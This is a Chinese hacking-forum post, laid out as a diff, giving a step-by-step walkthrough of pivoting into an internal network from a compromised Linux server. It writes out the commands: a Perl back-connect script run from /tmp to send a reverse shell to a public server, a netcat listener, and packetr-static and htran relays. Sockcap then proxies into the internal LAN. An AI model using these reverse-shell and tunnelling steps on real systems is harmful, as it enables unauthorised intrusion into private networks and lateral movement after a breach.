@@ -1,0 +1,76 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+Linux下的内网反弹实例
+D8888D主贴内容-------------------------------------------------------
+ 
+
+这个东西，恩，很早就想写了，……，朋友已经写出来了，就贴过来吧
+
+遇到一个案例,细节不表,把在案例中的操作方法在本机模拟了下,记录之.
+
+环境:
+
+被攻陷的Linux主机(拿到root权限)-----模拟为我内网的一台Linux服务器 192.168.0.105
+
+hack的操作用机-----我的电脑 192.168.1.101
+
+反弹到公网的服务器-----我自己的公网服务器 61.160.2xx.xxx
+
+渗透测试用的windows测试机  192.168.1.109
+
+工具:
+
+packetr-static  Linux下的
+
+htran.exe   windows下的
+
+sockcap 用作代理进入内网渗透的利器
+
+过程:
+
+1.我模拟下极度苛刻的情况下的环境,该攻陷的Linux服务器对外不开放22,只存在web端口80,那么我们必须得反弹shell到公网的机器上,这点我虚拟机里面没 这个环境,我就直接说下简要的
+
+上传back.pl文件到linux下的tmp目录下,执行
+
+perl /tmp/back.pl xxx.xxx.xxx.xxx 端口
+
+在公网的服务器上,运行nc执行
+
+nc -l -v -p 端口(跟上面的一样)
+
+现在我弹2个窗口回来,一个开代理,一个转发数据
+
+把packetr-static传上去,执行
+
+./packetr-static -s 1988
+[img]http://www.normb.net/attachments/date_201005/b5f22b47532a437c5c054558faca8c1f.jpg[/img]
+
+一个窗口转发数据,执行
+
+./packetr-static -slave 61.160.20x.xxx 123 127.0.0.1 1988
+[img]http://www.normb.net/attachments/date_201005/thumb_7adf1dfdfec95829f692ba3fc4ee25b4.jpg[/img]
+
+
+
+
+2.在windows公网端执行,
+
+htran.exe -p -listen 123 1988
+[img]http://www.normb.net/attachments/date_201005/ec7df6f92093cd8275a0098e1dce615c.jpg[/img]
+
+
+
+3.配置sockcap
+
+[img]http://www.normb.net/attachments/date_201005/75100274492471875891a9bbf943bf1a.jpg[/img]
+
+
+4.运行代理程序进入内网
+[img]http://www.normb.net/attachments/date_201005/thumb_ea1a69963227965243e76150fdbbf1fe.jpg[/img]
+
+
+
+
+
+[url=http://www.hackersb.com]链接标记http://www.hackersb.com[/url]
